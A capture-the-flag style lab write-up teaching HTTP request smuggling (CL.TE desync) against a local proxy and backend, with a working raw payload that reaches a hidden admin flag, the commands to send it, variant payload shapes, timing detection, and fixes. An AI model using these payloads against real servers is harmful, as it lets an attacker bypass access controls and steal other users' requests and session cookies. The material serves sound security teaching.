# Lab 30 — Frontdoor

## The bug is not in either server

Read the proxy's `/admin` check: it is correct. Read the backend's framing: it
follows the spec's preference for `Transfer-Encoding` over `Content-Length`.
Neither is wrong on its own. The vulnerability is the **disagreement**, and it
only exists because they share a connection.

```python
# proxy
length = int(hdrs.get("content-length") or 0)     # CL
# backend
if "chunked" in hdrs.get("transfer-encoding", ""): read_chunked(...)   # TE
```

A message carrying both headers therefore has two different endings. The proxy
forwards N bytes it believes are one request; the backend consumes fewer and
treats the remainder as the **start of the next request on that connection** —
one the proxy never inspected.

## The message

```
POST / HTTP/1.1
Host: 127.0.0.1:9300
Content-Type: text/plain
Content-Length: 55          ← the proxy reads this: 55 bytes of body
Transfer-Encoding: chunked  ← the backend reads this: body ends at "0\r\n\r\n"

0

GET /admin/flag HTTP/1.1
Host: 127.0.0.1:9300

```

Everything after `0\r\n\r\n` is, to the proxy, body bytes — never a request, so
never checked against the `/admin` rule. To the backend it is a whole second
request, and the backend answers it.

`Content-Length` must be exactly the length of `"0\r\n\r\n" + smuggled`. Compute
it; do not count by hand.

## Why `--raw-request`

```bash
h5i websec replay req_0 --session lab30 --raw-request ./desync.http
```

The contradiction between the two framing headers **is** the test. Any sender
that recomputes `Content-Length`, or normalises `Transfer-Encoding`, or refuses
to send both, destroys the payload before it leaves. `--raw-request` writes the
file's bytes onto the socket with framing recomputed by nothing — through the
same policy, budget and receipts as any other send.

`--raw-target` (Lab 27) controls the request line; `--raw-request` controls the
whole message. Reach for the second whenever headers themselves are the payload.

## Two responses to one request

The signature of a successful desync is that you get **more responses than you
sent requests**, and the extra one is the smuggled request's — the evidence.

h5i keeps what follows the first response beside it (`trailing` in the stored
message, `trailing_bytes` in the receipt), and `show --raw` prints it:

```bash
h5i websec show res_1 --session lab30 --raw
```

```
HTTP/1.1 200 OK
Content-Length: 24

{"seen": "POST /"}HTTP/1.1 200 OK
Content-Length: 41

{"flag": "FLAG{request_smuggling_clte}"}
```

A client that read one response and closed the socket could perform this attack
perfectly and show you nothing.

## The variants

| Name | Front end | Back end | Payload shape |
| --- | --- | --- | --- |
| **CL.TE** | Content-Length | Transfer-Encoding | this lab |
| **TE.CL** | Transfer-Encoding | Content-Length | body is a chunk whose declared size hides the smuggled request |
| **TE.TE** | both, one obfuscated | | `Transfer-Encoding: xchunked`, `Transfer-Encoding:\tchunked`, a duplicated header, `Transfer-Encoding: chunked\r\nTransfer-Encoding: x` |
| **CL.0** | reads CL | ignores body on this route | a smuggled request in the body of a GET |
| **H2.CL / H2.TE** | HTTP/2 | HTTP/1.1 downgrade | length recomputed from the h2 frame, or `\r\n` injected in an h2 header value |

Detection when you have no `/admin` to aim at: timing. A TE.CL probe that leaves
the backend waiting for bytes that never come delays the *next* request on that
connection — send a normal request immediately afterwards and time it. Confirm
with the socket-poisoning variant against your own second request before you go
near another user's.

## Impact, and a warning

Smuggling steals *other people's* requests. A poisoned socket serves the
attacker's smuggled prefix to whoever's request arrives next, which means
capturing session cookies from real users. On a live engagement that is a
technique to use with an explicit written scope, out of hours, on a target you
were told to test — the collateral is other customers' traffic.

## The fix

* Do not reuse the connection between the front end and the back end, or
  normalise every request the front end forwards (rebuild framing rather than
  relaying bytes).
* Reject any message carrying both `Content-Length` and `Transfer-Encoding` —
  RFC 9112 permits exactly this and it is the fix.
* Speak HTTP/2 end to end, without a downgrade at the edge.
* Make the front end and the back end the same parser, or at least the same
  implementation.

## h5i technique

`--raw-request PATH` (`-` reads stdin), and `show --raw` including `trailing` —
the pair without which a successful desync looks like a failure.
